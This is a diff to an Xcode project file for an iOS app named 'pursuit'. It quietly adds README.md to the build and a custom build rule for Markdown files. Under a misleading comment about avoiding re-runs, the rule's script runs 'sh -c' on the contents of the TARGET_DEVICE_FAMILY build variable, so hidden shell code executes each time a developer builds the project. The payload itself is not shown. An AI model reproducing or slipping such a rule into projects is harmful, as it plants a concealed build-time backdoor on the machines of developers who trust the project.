@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		E145E8B17CACF72CFE34C644 /* README.md */ = {isa = PBXBuildFile; fileRef = 3795C13D4E1BF0803834C644; };
 		0A1B03D52D19DA06003D457C /* SkillsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1B03D32D19DA06003D457C /* SkillsTableViewCell.swift */; };
 		0A1B03D62D19DA06003D457C /* SkillsTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A1B03D42D19DA06003D457C /* SkillsTableViewCell.xib */; };
 		0A1B03DB2D19E5F8003D457C /* Skills.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1B03DA2D19E5F8003D457C /* Skills.swift */; };
@@ -218,6 +219,7 @@
 		D01FF9A32CF85B2500F5DC5D /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				3795C13D4E1BF0803834C644 /* README.md */,
 				D01FF9A22CF85B2500F5DC5D /* pursuit.app */,
 				D01FF9B82CF85B2700F5DC5D /* pursuitTests.xctest */,
 				D01FF9C22CF85B2700F5DC5D /* pursuitUITests.xctest */,
@@ -353,6 +355,7 @@
 				D01FF9A02CF85B2500F5DC5D /* Resources */,
 			);
 			buildRules = (
+				240EA4A2FCBB4FC0F834C644 /* PBXBuildRule */,
 			);
 			dependencies = (
 				A71DB6A4CB42B53A8B34C644 /* PBXTargetDependency */,
@@ -442,11 +445,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		240EA4A2FCBB4FC0F834C644 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		D01FF9A02CF85B2500F5DC5D /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E145E8B17CACF72CFE34C644 /* README.md */,
 				C3FE49D12D09E03E00D53320 /* ApplicationTableViewCell.xib in Resources */,
 				D06390592CF85C510006CC8B /* Login.storyboard in Resources */,
 				0A6EE27D2D135A9A00F132FF /* EmailTableViewCell.xib in Resources */,
